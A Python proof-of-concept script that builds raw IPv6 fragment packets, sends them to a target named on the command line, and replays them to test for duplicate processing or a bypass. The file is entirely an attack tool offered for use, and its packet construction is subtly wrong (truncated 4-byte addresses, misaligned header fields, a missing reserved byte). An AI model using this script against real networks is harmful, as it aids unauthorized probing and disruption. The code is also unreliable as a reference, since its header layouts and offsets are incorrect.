#!/usr/bin/env python3
import struct
import socket
import sys
import time
import os

# Constants for IPv6 and Fragment Header
IPV6_HEADER_LEN = 40
FRAGMENT_HEADER_LEN = 8
NEXT_HEADER_FRAGMENT = 44  # IPv6 Next Header value for Fragment Extension Header

# Helper function to calculate checksum (not used for IPv6, but good practice)
def calculate_checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    checksum = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        checksum += word
        checksum &= 0xFFFFFFFF
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

# Function to craft an IPv6 packet with a Fragment Extension Header
def craft_ipv6_fragment(src_ip, dst_ip, next_header, payload, frag_id, frag_offset, m_flag):
    # IPv6 Header
    version_traffic_class_flow_label = 0x60000000  # Version 6, Traffic Class 0, Flow Label 0
    payload_length = len(payload) + FRAGMENT_HEADER_LEN
    next_header_ipv6 = NEXT_HEADER_FRAGMENT  # Points to Fragment Header
    hop_limit = 64
    
    ipv6_header = struct.pack('!II BB H 4s 4s',
        version_traffic_class_flow_label,
        payload_length,
        next_header_ipv6,
        hop_limit,
        0,  # Padding
        socket.inet_pton(socket.AF_INET6, src_ip),
        socket.inet_pton(socket.AF_INET6, dst_ip)
    )
    
    # Fragment Extension Header
    # Next Header, Reserved, Fragment Offset (13 bits), M flag, Fragment ID (32 bits)
    frag_header_reserved = 0
    frag_offset_m = (frag_offset << 3) | (1 if m_flag else 0)
    
    fragment_header = struct.pack('!B H I',
        next_header,
        frag_offset_m,
        frag_id
    )
    
    return ipv6_header + fragment_header + payload

# Function to send raw IPv6 packet
def send_ipv6_packet(packet_data, src_ip, dst_ip, interface):
    sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_IPV6)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
    sock.sendto(packet_data, (dst_ip, 0, 0, 0))
    sock.close()

# Main function to demonstrate the attack
def main():
    if len(sys.argv) != 5:
        print("Usage: python poc_ipv6_fragment_replay.py <src_ip> <dst_ip> <interface> <payload>")
        sys.exit(1)
    
    src_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    interface = sys.argv[3]
    payload = sys.argv[4].encode()
    
    # Split payload into two fragments for demonstration
    mid = len(payload) // 2
    frag1_payload = payload[:mid]
    frag2_payload = payload[mid:]
    
    # Fragment ID (should be predictable or reused for replay)
    frag_id = 0x12345678
    
    # Craft first fragment (M=1, Offset=0)
    frag1 = craft_ipv6_fragment(src_ip, dst_ip, 6, frag1_payload, frag_id, 0, True)
    
    # Craft second fragment (M=0, Offset=mid/8)
    frag2 = craft_ipv6_fragment(src_ip, dst_ip, 6, frag2_payload, frag_id, mid // 8, False)
    
    # Send fragments
    print(f"Sending Fragment 1 to {dst_ip}...")
    send_ipv6_packet(frag1, src_ip, dst_ip, interface)
    
    print(f"Sending Fragment 2 to {dst_ip}...")
    send_ipv6_packet(frag2, src_ip, dst_ip, interface)
    
    # Simulate replay after a short delay
    time.sleep(1)
    print("Replaying fragments...")
    send_ipv6_packet(frag1, src_ip, dst_ip, interface)
    send_ipv6_packet(frag2, src_ip, dst_ip, interface)
    
    print("Replay complete. Check target for duplicate processing or bypass.")

if __name__ == "__main__":
    main()